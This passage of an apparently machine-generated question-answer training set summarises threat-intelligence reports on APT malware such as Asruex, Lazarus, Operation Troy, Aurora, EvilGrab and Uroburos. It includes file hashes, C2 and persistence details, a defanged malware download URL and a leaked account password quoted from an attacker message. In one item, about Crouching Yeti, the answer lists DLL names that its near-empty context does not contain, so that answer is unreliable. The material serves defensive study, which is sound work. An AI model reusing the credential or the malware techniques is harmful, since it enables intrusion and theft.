625066ec634da9a41d08f2855617\ne139a8916f99ce77dbdf57eaeac5b5ebe23367e91f96d7af59bee7e5919a7a81\n8a6d76bd21e70a91abb30b138c12d0f97bb4971bafa072d54ce4155bea775109\n35fc95ec78e2a5ca3c7a332db9ca4a5a5973607a208b9d637429fe1f5c760dd5\nAsruex:\n8af41d303db8a975759f7b35a236eb3e9b4bd2ef65b070d19bd1076ea96fa5c4\na9ce1f4533aeec680a77d7532de5f6b142eb8d9aec4fdbe504c37720befe9ce3\n9350f7eb28f9d72698216105c51a4c5ad45323f907db9936357d6914fc992c90\n694de22c0b1a45c0e43caaa91486bc71a905443b482f2d22ded16b5ce3b0e738\n18e12feeb3fb4117ca99e152562eada2eb057c09aab8f7a424e6d889f70feb6c\n148a834e2717d029a4450dfa7206fd7d36c420edb95068c57766da0f61b288e8\nd869ce2ba491713e4c3f405ad500245d883b0e7b66abeee2522e701c8493388a\nfca19a78fc71691f3f97808624b24f00dd1f19ccadcc6e3a7e2be5b976d8937b\neb31f931f0e2abf340f3f95861a51e30677fd4216b2e4ee4d8570b41cb41249c\n7a95930aa732d24b4c62191247dcdc4cb483d8febaab4e21ca71fec8f29b1b7c\nAdvProv.dll\nf06000dceb4342630bf9195c2475fcd822dfe3910b0fa21691878071d0bb10fc\nOthers\n6d4e7d190f4d7686fd06c823389889d226ea9c8524c82c59a765bba469f2f723\ne7d51bb718c31034b597aa67408a015729be85fc3aefcc42651c57d673a4fe5a\n7074a6d3ab049f507088e688c75bae581fad265ebb6da07b0efd789408116ec8\n\nBased on the above text, answer a question. How does Asruex communicate with its Command and Control (C&C) server, and what types of commands can it execute upon receiving instructions?",
    "output": "Asruex communicates with its C&C server over HTTP. It first sends an HTTP request to a dummy host and, upon receiving a valid response, connects to the actual C&C server. Asruex can execute various commands received from the C&C server, including commands for collecting information and downloading additional DLL files (AdvProv.dll) to expand its functionality. These commands allow Asruex to perform actions such as gathering system information, executing additional payloads, and interacting with the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ProjectSauron APT achieve persistence on infected systems, allowing it to maintain its foothold across restarts and other interruptions?",
    "output": "The ProjectSauron APT achieves persistence through various techniques, including registering its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter. This allows the malware to start every time a domain, local user, or administrator logs in or changes a password, and promptly harvests the passwords in plaintext. Additionally, the APT uses a modified Lua scripting engine to implement its core platform and plugins, which enables it to maintain its foothold on systems even after restarts. The malware also uses a virtual file system (VFS) to store its modules and data, making it difficult to detect and remove. Furthermore, the APT's use of strong encryption algorithms and secure communication protocols, such as DNS and HTTPS, makes it challenging to detect and block its communication with its command and control (C2) servers. Overall, the ProjectSauron APT's persistence techniques allow it to maintain its foothold on infected systems, enabling it to conduct long-term cyber espionage campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Several Polish banks hacked, information stolen by unknown attackers\nbadcyber\n2/3/2017\nPolish banks are frantically scanning their workstations and servers while checking logs in the search of signs of infection after some of them noticed unusual network activity and unauthorised files on key machines within their networks. This is \u2013 by far \u2013 the most serious information security incident we have seen in Poland.\nIt has been a busy week in SOCs all over Polish financial sector. At least a few of Polish 20-something commercial banks have already confirmed being victims of a malware infection while others keep looking. Network traffic to exotic locations and encrypted executables nobody recognised on some servers were the first signs of trouble. A little more than a week ago one of the banks detected strange malware present in a few workstations. Having established basic indicators of compromise managed to share that information with other banks, who started asking their SIEMs for information. In some cases the results came back positive.\n\nAnswer this question based on the above context: Why did several Polish banks experience a sudden increase in network activity and the presence of unauthorized files on critical machines? How did this discovery lead to the identification of a widespread malware infection across multiple banks?",
    "output": "Several Polish banks experienced a sudden increase in network activity and the presence of unauthorized files on critical machines due to a malware infection. One bank initially detected the strange malware on a few workstations and shared the basic indicators of compromise with other banks. These banks then queried their Security Information and Event Management (SIEM) systems, which returned positive results in some cases, confirming the spread of the malware infection across multiple institutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: [File MD5]\n0775D753AEAEBC1CFF491E42C8950EC0\n0AC90C7AD1BE57F705E3C42380CBCCCD\n0F994F841C54702DE0277F19B1AC8C77\n196FE14B4EC963BA98BBAF4A23A47AEF\n1E7D604FADD7D481DFADB66B9313865D\n2EF844ED5DCB9B8B38EBDE3B1E2A450C\n39457097686668A2F937818A62560FE7\n3D7E3781BD0B89BA88C08AA443B11FE5\n3ECD26BACD9DD73819908CBA972DB66B\n4B96D9CA051FC68518B5A21A35F001D0\n4E2DFD387ADDEE4DE615A57A2008CFC6\n5349C845499A6387823FF823FCCAA229\n570F65824F055DE16EF1C392E2E4503A\n683713A93337F343149A5B3836475C5D\n6929CAA7831AE2600410BC5664F692B3\n6A240B2EDC1CA2B652DBED44B27CB05F\n7188F827D8106F563980B3CCF5558C23\n7607EF6426F659042D3F1FFBFEA13E6A\n7870DECBC7578DA1656D1D1FF992313C\n7BF6B3CD3B3034ABB0967975E56F0A4B\n81E922198D00BE3E6D41DCE773C6A7FB\n878AD11012A2E965EA845311FB1B059F\n8FCDF6506CA05EFAFC5AF35E0F09B341\n933B640D26E397122CE8DE9293705D71\nA329AC7215369469D72B93C1BAC1C3C4\nA8B90B2DD98C4FDD4AE84A075A5A9473\nADF0D4BBEFCCF342493E02538155E611\nB213063F28E308ADADF63D3B506E794E\nB3E03A41CED8C8BAA56B8B78F1D55C22\nB5EAEC8CE02D684BAA3646F39E8BC9B5\nB85FDE972EE618A225BFBA1CEF369CC8\nB91D1A5CC4A1DE0493C1A9A9727DB6F9\nB974BC9E6F375F301AE2F75D1E8B6783\nBB9F5141C53E74C9D80DCE1C1A2A13F0\nC99D5E7EDBA670515B7B8A4A32986149\nCB5401C760B89D80657FC0EFC605AE62\nD3BFA72CC8F6F8D3D822395DBC8CD8B8\nD57F8CD2F49E34BEDA94B0F90426F7B3\nD9BC5EDCE4B1C4A941B0BF8E3FAC3EA8\nDD3710ABFACDF381801BB11CF142BD29\nDD759642659D7B2C7FD365CBEFF4942E\nE04206BA707DE4CDE94EFEDA6752D0CA\nE6265DCCFDEF1D1AA134AEC6236734F8\nE84404DED7096CD42EF39847DE002361\nE8D7EAF96B3E5AEE219013C55682968C\nEC99EBB78857211EB52EB84750D070E7\nF15FD25A4C6E94E2202090BBB82EBC39\nF48369111F2FAABB0CCB5D1D90491E0E\n\nHow did the Lazarus attack group exploit the INITECH process to distribute malware, and what specific actions were taken by the malicious code SCSKAppLink.dll once injected into the inisafecrosswebexsvc.exe process?",
    "output": "The Lazarus attack group exploited the INITECH process by injecting the malicious code SCSKAppLink.dll into the inisafecrosswebexsvc.exe process. Once injected, SCSKAppLink.dll contained code that branched according to the injected host process. Specifically, when injected into the inisafecrosswebexsvc.exe process, it accessed a URL (hxxps://matric.or.kr/include/main/main_top.asp?prd_fld=racket) to download and execute additional malicious code. The inisafecrosswebexsvc.exe process, now compromised, connected to the malicious code distribution site, downloaded the downloader malware main_top[1].htm file to the Internet temporary folder path, and copied it to SCSKAppLink.dll. The download path was c:\\\\users\\\\<user>\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\inetcache\\\\ie\\\\zlvrxmk3\\\\main_top[1].htm, and the copied path was C:\\\\Users\\\\Public\\\\SCSKAppLink.dll.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Attack Timeline\nOur analysis suggests the following order of these attacks. Later in this report we mention other elements that color our view of this event, but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component.\nMarch 20 attack against banks and news agencies in South Korea:\n1. The remote-access Trojan was compiled January 26, 2013.\n2. The component to wipe the master boot record (MBR) of numerous systems was compiled January 31.\n3. An initial victim within the organization was spear-phished with the remote-access Trojan. This likely occurred before March 20, and possibly weeks prior to the attack.\n4. The dropper was compiled March 20, hours before the attack occurred.\n5. The dropper was distributed to systems across the victim organizations, and within minutes of execution the MBRs were wiped. This occurred around 2:00 pm Seoul time on March 20.\nBig Headline: The adversaries\nThe two groups that appear to have been involved in the attacks have had no prior connection until now.\n\u2022 NewRomanic Cyber Army Team. The samples connected to this group are more convincing. The majority of the wipers (found in the wild and retrieved from infected systems through other sources) contain the strings \"principes\" and \"hastati,\" which also appear in a message left on one of the targeted websites in the form of a web pop-up. The wiper component also overwrote the MBR with one of these strings. The following data points support this fact:\n\u2013 The strings \"principes\"1 and \"hastati\"2 were found within the code of some of the wiper components. The same strings were also found in the web pop-up message that was left on the Nocut News Korea website. The strings are ancient Roman terms that make reference to military units, hence a \"cyberarmy.\" The pop-up even states some of the specific units that were part of hastati which were involved in this attack.\n\u2013 The remote-access Trojan that was found had a build path which included the reference \"Make Troy,\" a subdirectory of the folder \"Work.\" Troy3 refers to an ancient Roman region, again connecting the Roman references to this group, which consistently uses this theme.\n\u2022 The Whois Hacking Team. On March 20, the website of the network provider LG +U was defaced by this group. Was it a coincidence that a second group was involved? All of the evidence indicates that they had a strong involvement, but there is no solid link to the group because it did not claim involvement in the attacks. However, we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by the NewRomanic Cyber Army yet also appears to be essentially the same wiper. The Whois Hacking Team MBR wiper component includes the same graphics (in a resource file in the binary) that appeared on the defaced LG +U website, although the malware did not behave the same way. Within the main executable file, however, we discovered a small portion of the code that matched the structure of that of the NewRomanic Cyber Army wipers we found, so the Whois Team likely dropped the same wiper.\nState sponsored or not, these attacks were crippling nonetheless. The overall tactics were not that sophisticated in comparison to what we have seen before. The trend seems to be moving toward using the following techniques against targets:\n\u2022 Stealing and holding data hostage and announcing the theft. Public news media have reported only that tens of thousands of computers had their MBRs wiped by the malware. But there is more to this story: The main group behind the attack claims that a vast amount of personal information has been stolen. This type of tactic is consistent with Anonymous operations and others that fall within the hacktivist category, in which they announce and leak portions of confidential information.\n\u2022 Wiping the MBR to render systems unusable, creating an instant slowdown to operations within the target\nBig Headline: The Analysis\nWhat were the motives behind these attacks and why did the attackers chose certain targets? The attacks managed to create a significant disruption of ATM networks while denying access to funds. This wasn't the first time that this type of attack\u2014in which destructive malware wiped the systems belonging to a financial institution\u2014has occurred in South Korea. In 2011 the same financial institution was hit with destructive malware that caused a denial of service.\nThe attackers left a calling card a day after the attacks in the form of a web pop-up message claiming that the NewRomanic Cyber Army Team was responsible and had leaked private information from several banks and media companies.\nThey also referenced destroying the data on a large number of machines (the MBR wiping) and left a message in the web pop-up identifying the group behind the attacks. The page title in Internet Explorer was \"Hey, Everybody in Korea????\"\n\"Hi, Dear Friends, We are very happy to inform you the following news. We, NewRomanic Cyber Army Team, verified our #OPFuckKorea2003. We have now a great deal of personal information in our hands. Those includes; 2.49M of _ member table data, cms_info more than 50M from . Much information from\nBank. We destroyed more than 0.18M of PCs. Many auth Hope you are lucky. 11th, 12th, 13th, 21st, 23rd and 27th HASTATI Detachment. Part of PRINCIPES Elements. p.s For more information, please visit www.dropbox.com login with joseph.r.ulatoski@gmail.com::lqaz@WSX3edc$RFV. Please also visit pastebin.com.\"\nBig Headline: The Malware\nA few types of malware were involved in these attacks. Each variant had a particular use. Some public reports mentioned only the use of the wiper component; however, there were actually three components, all with a different purpose, that assisted the attackers in the campaign.\nThere were two subsequent aspects to this attack:\n\u2022 The destruction of PCs using the MBR wiper component. Occurred March 20.\n\u2022 Remote access to the targets' environments for a period prior to the attack. The duration of this access is unknown.\nBig Headline: The dropper Trojan\nThe dropper Trojan was primarily used to download the executable that destroyed the systems' MBRs. We suspect that the dropper Trojan was distributed at the time of the attacks via a compromised patch-management server that pretended to run a legitimate update.\nThe dropper Trojan was compiled March 20, the day of the attack and several hours prior to the destruction of the systems. We suspect that the attackers had access to the target environment prior to March 20. It is unlikely that a large volume of users (some 30,000+) were spear-phished on March 20 alone.\nIt's likely a much earlier compromise led to the attacks' being staged internally. Thus, there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly. The initial infection certainly could have come from a spear-phishing attack. The backdoor component was compiled in late January. The attackers could have been inside the networks since February. This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs.\nOur further analysis led us to discover additional components that support our conclusion:\n\u2022 A remote-access Trojan was discovered to have compromised some of the target environments, specifically an internal server used to distribute updates to thousands of PCs. This Trojan variant was compiled January 26, and was detected by the security industry on March 25. McAfee detects this threat as RDN/Generic PWS.y!io. This Trojan was built with the Microsoft Visual C++ Version 2.9 compiler with a file size of 47KB.\nBig Headline: MBR wiper\nWe have seen several wiper samples to date; all were compiled January 31. The wiper itself is relatively small (24KB) and is introduced into the environment via a dropper Trojan that is 418KB and was compiled the day of the attacks.\nUpon executing the malware, the main dropper (9263e40d9823aecf9388b64de34eae54) creates the file AgentBase.exe, the MBR wiper component. This file is placed in the infected user's application data folder, executes, and immediately starts the countdown to wipe the system and render it unbootable. This file was compiled approximately two months prior to the attack's taking place.\nThe main dropper component was compiled the day of the attack, March 20, at 4:07 am Seoul time. The dropper installed the wiper, which destroyed the MBRs at around 2:00 pm Seoul time. Once the dropper executed, the system were wiped within minutes. Thus, these components likely weren't distributed until the time when the attackers wished to destroy these machines.\nBig Headline: The remote-access Trojan\nIt's not widely known that the attackers used a remote-access Trojan to compromise an internal server. The attackers used this internal server to distribute the wiper component to the thousands of PCs. The remote-access Trojan had a file size of 46KB and was compiled on January 26, five days before the MBR wiper was compiled.\nAs we concluded earlier, we have determined that the attackers had access to the environment prior to wiping the systems. The remote-access Trojan was likely delivered to an internal PC via a spear-phishing campaign. From this system the attackers accessed other internal resources. The Trojan was designed to operate within Internet Explorer; it launched a hidden instance of Internet Explorer and injected itself into the running process.\nThe Trojan immediately modified the properties in the registry to allow for remote connections to the system.\n\nQuestion: What evidence supports the involvement of the NewRomanic Cyber Army Team in the Operation Troy attacks?\n\nAnswer:",
    "output": "Several pieces of evidence support the involvement of the NewRomanic Cyber Army Team. First, the strings 'principes' and 'hastati,' which are ancient Roman military terms, were found within the code of some of the wiper components and in a web pop-up message left on the Nocut News Korea website. Additionally, the remote-access Trojan had a build path that included the reference 'Make Troy,' a subdirectory of the folder 'Work.' These Roman references and themes are consistent with the group's naming and messaging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Malware Summary of Findings and Analysis\nThe predecessor Aurora malware comes from two different families. The newer family came immediately 2 months after the older family, and there was no overlap in their prevalence. For the older family, there was neither an observable protection mechanism nor an AV evasion technique. It was simply a dropper for keylogger files. The newer family has some protection mechanisms and AV evasion techniques. However, it lacks the sophistication found in other botnet malware families.\nBelow is a summary of the findings of the two malware families that were analyzed.\nCommon characteristics:\n1. Served through fake AV hosting Web sites (no longer available)\n2. Common autostart techniques\n3. Common older stealth techniques\n4. Multiple malware server domains to improve resiliency\n5. Droppers and dropped files (EXE and DLLs) were compiled using Microsoft compilers\nDifferences:\n1. Main malware component:\na. November 2009 Family \u2013 uses DLL file as one of its components\nb. August 2009 Family \u2013 uses VXD and SYS files\n2. Main function:\na. November 2009 Family \u2013 pop-up ads\nb. August 2009 Family \u2013 Suspected keylogger (actual files are no longer available for analysis)\n3. Protection Mechanism:\na. November 2009 Family \u2013 uses basic protection mechanisms to hide itself\nb. August 2009 Family \u2013 none observed\nComparing them to Trojan.Hydraq:\n1. Code obfuscation\n\u2022 Trojan.Hydraq uses \"spaghetti code\" in which program elements are separated into small chunks and connected via jump instructions. This technique complicates following the code, and is similar to the tactics employed in old PE viruses that write to small spaces in the host and connect themselves through jump instructions.\n\u2022 November 2009 Family \u2013 Does not use any code obfuscation. One dropped file is actually packed using FSG v1.33.\n\u2022 August 2009 Family \u2013 None observed.\n2. Autostart Technique\n\u2022 Trojan.Hydraq uses Svchost process in Windows by adding its service name in \"netsvcs\". When Windows starts, it will load the service into memory.\n\u2022 November 2009 Family \u2013 Uses common autostart technique using the \"Run\"key.\n\u2022 August 2009 Family \u2013 Uses common autostart technique using the \"Run\" key.\n3. Intent / Payload\n\u2022 Trojan.Hydraq \u2013 Information gathering\n\u2022 November 2009 Family \u2013 Pops up ads and Web site redirector\n\u2022 August 2009 Family \u2013 Information gathering\nMedium Headline: Malware Significance\nBasing on the profile of the two malware families that were analyzed, they are obviously different from each other. The key thing they have in common is that the CnC they utilize are publicly associated with the Aurora botnet.\nThe botnet controllers preyed on the fear of users that their system is infected with malware. This method saves the botnet controllers from the technical complexity of bypassing Windows' UAC by using the weakest link in host security \u2013 which is the user. The misled user typically clicks OK to everything, bypassing UAC and giving the malware dropper explicit permission to execute.\nNeither of the malware predecessor families exhibit the sophistication found in newer malware. Some of the evasion techniques are almost a decade old. Both families use two sets of domains: one for serving malware and the other for CnC.\nThe droppers and dropped files were compiled using Microsoft Compilers. This is evidenced by the presence of the string \"Rich\" before the PE header. This watermark is undocumented, meaning there is no mention of this watermark from Microsoft references but they are present in binaries compiled using Microsoft Compilers. Knowing the compiler of choice might help investigators narrow down the individuals or group of individuals responsible for the code.\nThe simplicity and relative obsolescence of the early versions of the Aurora malware suggest that these malware families were created or written by an individual or group of individuals new to the production of commercial grade malware. Based solely on these families of malwares, it also appears that different individuals or group of individuals created the code:\n\u2022 The only association the different families have with each other is that they used CnCs associated with Operation Aurora, and they were distributed via similar means. That said, it is possible that two different groups purchased the services of the same crimeware group (probably the same people behind Operation Aurora) to distribute and manage their malware family. Or the crimeware group rented out different variants of the same malware to different groups with different intentions. Price may also be a factor. The less resilient the malware family is, the cheaper it is to purchase or rent.\n\u2022 The intent of each malware family is different.\n\u2022 There is no natural progression seen between the two families. Usually malware writers evolve in both technology and protection of their creation but these two families did not show any related evolution. The malware families appear to exist independently, and then become superseded by Trojan.Hydraq.\nBig Headline: Piecing it Together\nDamballa analyzed network DNS information from a number of distinct and complementary sources ranging from global monitoring systems, enterprise monitoring sensors, passive DNS resolution data\nand other DNS streams for this report. At the same time, Damballa also analyzed the malware commonly associated with the Aurora attacks disclosed by Google in January. The result has been a definite correlation between key CnC channels with other malware families that are associated with the criminal operators behind the Aurora botnet.\nBased upon our analysis of this attack and the surrounding evidence currently available, we classify the attacks against Google and the other previously identified victim organizations as being typical of current botnet criminal practices. The attack is most notable not for its advanced use of an Internet Explorer 6 Zero-Day exploit, but rather for its unsophisticated design and a pedigree that points to a fast-learning but nevertheless amateur criminal botnet team.\nMedium Headline: DDNS Findings Summary\nBased upon Damballas investigation of DDNS data, the key findings are as follows:\n1. The botnet has a simple command topology and makes extensive use of DDNS CnC techniques. The construction of the botnet would be classed as \"old-school\", and is rarely used by professional botnet criminal operators any more. However, such reliance upon DDNS CnC is commonly associated with new and amateur botnet operators\n2. There were several CnC domains were identified based upon key characteristics of the registration and management of the previously publicly disclosed CnC domains.\n3. The major pattern of attacks in mid-December appear to have their origin in July 2009 in mainland China. This likely corresponds to early testing of the botnet CnC.\n4. Some of the infections appeared to start within Google's network. Some of apparent botnet the traffic is not consistent with an IE6/WinXP infection and cannot be easily explained.\n5. The attackers had access to large numbers of CnC hosts in geographically diverse hosting co-locations \u2013 certainly a high number for a botnet. Further, the botnet used over a dozen domains in diverse DDNS networks for CnC.\n6. Only the US victims were compelled to perform MX queries, an event that would typically indicate attempted document exfiltration via email services.\n7. Some of the botnets focused on victims outside of Google, suggesting that each domain might have been dedicated to a distinct class or vertical of victims.\n8. A review of the TTL period suggests that botmasters de-registered their domains around December 18, 2009.\nMedium Headline: Passive DNS Data Summary\nBased upon analysis of DNS resolution data gathered through a global network of passive DNS monitoring sensors, the key findings are as follows:\n1. Cumulative volume of CnC domain name resolutions provides adequate sampling to identify the initialization and growth phases of the Aurora botnet, which also reveals active operation of the CnC channels dating back to June 14th 2009.\n2. The victim's computers connected to, or were part of, 64 different networks, based upon Autonomous Systems (AS) breakdown of Internet netblocks which could represent the upper bound of organizations that may have been breached in the larger Aurora attack. Some organizations (such as Google) own and manage several AS networks. Some of the other AS networks were associated with public Internet Service Providers, which may encompass multiple small and medium businesses.\n3. The various CnC domains used by the criminal botnet operators peaked at different times with different rates of lookup by victim systems. These observations correspond to different campaigns run in parallel by different botnet operators and represent the widely publicized attacks that appeared to make use of the Internet Explorer 6 Zero-Day exploit. It is a common tactic by botnet operators to run multiple campaigns at the same time, using different infection vectors (e.g. drive-by downloads, FakeAV, USB infections, etc.) over extended periods of time. This strategy is very consistent with APT campaign methodologies.\n4. The vast majority of victim systems appear to have been based in the United States.\n5. It is possible to identify the various CnC testing, deployment, management and shutdown phases of the Aurora botnet CnC channels. Some of the CnC domains appear to have been dormant for a period of time after they had infected number victim systems. This type of activity can sometimes be associated with an update to the botnet malware or if the criminal operator sells/trades a segment of the botnet to another criminal operator.\nAnswer this question: What insights can be gained from the analysis of passive DNS data regarding the Aurora botnet's operations and victim distribution? How does this align with APT campaign methodologies?",
    "output": "The analysis of passive DNS data revealed several key insights about the Aurora botnet's operations and victim distribution. The cumulative volume of CnC domain name resolutions showed the initialization and growth phases of the botnet, with active operation dating back to June 14th, 2009. Victims were connected to 64 different networks, with the majority based in the United States. Different CnC domains peaked at different times, corresponding to parallel campaigns run by different botnet operators. This strategy aligns with APT campaign methodologies, where multiple infection vectors are used over extended periods to maximize impact and evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very\nRead the text above and answer this question: Based on the indicators of compromise listed, how does the Crouching Yeti APT group utilize DLL files for its malicious activities? What strategies can cybersecurity experts employ to detect and mitigate these threats?",
    "output": "The Crouching Yeti APT group utilizes various DLL files located in system directories, common application data folders, user-specific application data folders, and temporary directories. These DLL files include TMPprovider0XX.dll, svcprocess0XX.dll, Phalanx-3d.Agent.dll, Phalanx-3d.ServerAgent.dll, sydmain.dll, srvsce32.dll, ~tmpnet.dll, tmp687.dll, and others. These files are likely used to inject malicious code into legitimate processes, enabling the attackers to execute their payloads stealthily. To detect and mitigate these threats, cybersecurity experts can implement several strategies. First, they should monitor system directories and temporary folders for unusual DLL file creations or modifications. Additionally, they can use endpoint detection and response (EDR) solutions to track the behavior of processes and identify any suspicious activities, such as unexpected DLL loading or injection. Regularly updating antivirus software and maintaining up-to-date threat intelligence feeds can also help in identifying known malicious DLL files. Furthermore, implementing strict access controls and least privilege principles can limit the impact of malicious DLL files by restricting their ability to execute unauthorized actions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Tencent QQ Memory Reading\nIf the active window is Tencent QQ (specifically, QQ2009 through QQ2012), EvilGrab will attempt to steal information by directly reading the process's memory and checking if the class name of the focused window is not named \"EDIT.\"\nThe contents of the process's memory are then saved onto the system's hard drive as %UserProfile%\\users.bin. It is then sent back to the backdoor's C&C server. The file on the hard drive is encrypted; specifically, the data is XORed with the key 0x66.\nBig Headline: Backdoor Activity\nTo start its connection to its C&C server, the backdoor component will first send 5-bytes (\\x01\\x00\\x00\\x00\\x33). The C&C will reply if it accepts the connection. The backdoor then replies with a beacon message, the contents of which are as follows:\nEither backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns, which is recognizable by the C&C server and/or attacker. Some of the identifiers we saw in backdoor identifier 1 are:\n\u2022 006\n\u2022 007\n\u2022 0401\n\u2022 072002\n\u2022 3k-Ja-0606\n\u2022 3k-jp01\n\u2022 4k-lyt25\n\u2022 88j\n\u2022 e-0924\n\u2022 LJ0626\n\u2022 RB0318\nSome of the identifiers seen in our accumulated data in backdoor identifier 2 are as follows:\n\u2022 V2010-v16\n\u2022 V2010-v24\nWe noted a correlation between the MZ/PE headers of variants and the strings in backdoor identifier 2. Variants with a V2010-v24 identifier have a proper MZ/PE header; variants with a V2010-v16 header have portions of their header overwritten with JPEG strings. These variants require a loader component to load them into memory in order to be executed.\nBelow is a sample packet sent at the beginning of the connection:\nCode snapshot\nEvilGrab variants possess a wide variety of possible backdoor commands. The table below lists its possible commands:\nThis captured packet shows sample backdoor commands and replies:\nBackdoor command xC0: Get CPU info, Windows and System32 folder, hostname, user name and clipboard content\nBackdoor command x82: Get drive listings and types\nThese capabilities can be used for both lateral movement within a compromised organization and to steal information. EvilGrab steals internal user names and passwords as well as logs keystrokes. Credentials stolen this way can be used to move within the confines of the organization's network.\nEvilGrab possesses a wide variety of information theft capabilities. It can grab audio and video files directly from devices attached on the system (i.e. microphone and camera). In addition, EvilGrab can upload files from the affected system to remote servers. EvilGrab possesses a full range of capabilities that is expected in malware used in targeted attacks against organizations.\nBig Headline: Trend Micro Recommendations\nTargeted attacks pose a challenge to traditional signature-based security solutions. To deal with these type of threats, employ solutions that include network monitoring to detect and analyze incoming threats, as well as any outgoing communication with attacking parties.\nProducts like Trend Micro\u2122 Deep Discovery\u2122 are capable of mitigating the risks from these threats. One component of Deep Discovery, the Deep Discovery Inspector, provides network threat detection, custom sandboxing, and real-time analysis and reporting.\nThe second component, Deep Discovery Advisor, provides sandbox analysis of known and unknown threats that augments the capabilities of existing products like endpoint solution and email/web gateways. It also provides visibility to network-wide security events.\nThe capabilities provided by solutions like Deep Discovery are necessary to provide a unified, comprehensive view of the threats an organization faces. This information can then be used by an organization to create appropriate and proportional responses to properly protect an organization's network.\nBig Headline: References\n1 Sancho, David; Dela Torre, Jessa; Bakuei, Matsukawa; Villeneuve, Nart; and McArdle, Robert. (2013). Trend Micro Incorporated Research Paper. \"IXESHE: An APT Campaign.\" Last accesed August 30, 2013. (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf>)http://www.trendmicro. (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf>)com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf\n2 Trend Micro Incorporated. (2013). Trend Micro Incorporated Research Paper \"The Taidoor Campaign: An In-Depth Analysis.\" Last accessed August 30, 2013. (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_the_taidoor_campaign.pdf>)http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/ (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_the_taidoor_campaign.pdf>)white-papers/wp_the_taidoor_campaign.pdf\n3 Security TechCenter. (November 13, 2012). Microsoft Security Advisory. \"Microsoft Security Advisory (2269637): Insecure Library Loading Could Allow Remote Code Execution\" Last accessed August 30, 2013. (<http://technet.microsoft.com/en-us/security/advisory/2269637>)http://technet. (<http://technet.microsoft.com/en-us/security/advisory/2269637>)microsoft.com/en-us/security/advisory/2269637\n4 Microsoft. (2013). Windows Dev Center - Desktop. \"Using the Sample Grabber.\" Last accessed August 30, 2013. (<http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288%28v%3Dvs.85%29.aspx>)http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288(v=vs.85).aspx\n5 Microsoft. (2013). Developer Network. \"Recording and Playing Sound with the Waveform Audio Interface.\" Last accessed August 30, 2013. (<http://msdn.microsoft.com/en-us/library/aa446573.aspx%23waveinout_topic_006>)http://msdn.microsoft.com/en-us/library/aa446573.aspx#waveinout_topic_006\nTrend Micro Incorporated, a global leader in security software, strives to make the world safe for exchanging digital information. Our innovative solutions for consumers, businesses and governments provide layered content security to protect information on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are powered by cloud-based global threat intelligence, the Trend Micro\u2122 Smart Protection Network\u2122, and are supported by over 1,200 threat experts around the globe. For more information, visit (<http://www.trendmicro.com/us/index.html>)www.trendmicro.com.\n\u00a92013 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.\n10101 N. De Anza Blvd.\nCupertino, CA 95014\nU.S. toll free: 1 +800.228.5651 Phone: 1 +408.257.1500 Fax: 1 +408.257.2003\nAnswer this question: What are the primary capabilities of EvilGrab that facilitate lateral movement within a compromised organization, and how does it utilize these capabilities to steal information?",
    "output": "EvilGrab possesses a wide variety of backdoor commands and information theft capabilities that facilitate lateral movement within a compromised organization. Some of these capabilities include getting CPU info, Windows and System32 folder details, hostname, user name, and clipboard content (backdoor command xC0), and obtaining drive listings and types (backdoor command x82). Additionally, EvilGrab can steal internal usernames and passwords, log keystrokes, grab audio and video files directly from devices attached to the system (such as microphones and cameras), and upload files from the affected system to remote servers. These capabilities enable EvilGrab to move within the confines of the organization's network and steal sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Network capabilities\nThanks to the protocol described previously, the attacker can even target victims not directly connected to the Internet. The following figure shows an example of a network scheme we discovered in 2013:\nThe targeted machine (A) is a machine with access to sensitive data, e.g. a server. The rootkit installed on the system opens a Microsoft named pipe and waits for an incoming connection. This machine can be named \"spied-on node\".\nThe second machine (B) is an office machine with the capability to connect to the Internet. The rootkit is configured to connect to system (A), with the help of the named pipe, and administrate the machine remotely. Finally, machine (B) is able to pass on all data received from machine (A) to the Internet. This machine (B) could be named \"proxy node\".\nThis peer-to-peer design is really efficient, scalable and resilient. In case a \"proxy node\" is not available/detected, the attackers can use another infected one. The advantage for the attackers: even if a security specialist finds one \"spied-on node\", he cannot easily find the \"proxy node\", due to the fact that this node is a passive node. Furthermore, the analyst does not automatically have the command and control URL. In case of incident response, this design is complicated to apprehend and it is hard to contain the infection.\nMedium Headline: Victims and attribution\nDue to the complexity of the Uroburos rootkit, we estimate that it was designed to target government institutions, research institutions or companies dealing with sensitive information as well as similar high-profile targets.\nConcerning the attribution, we found some technical information which allows us to link the Uroburos rootkit to a cyber-attack against the United States of America, carried out in 20084 (<>)and, particularly, to the worm used by the attackers, called Agent.BTZ. During this 2008 campaign, a USB stick was deliberately \"lost\" in the parking lot of the United States Department of Defense. This USB stick 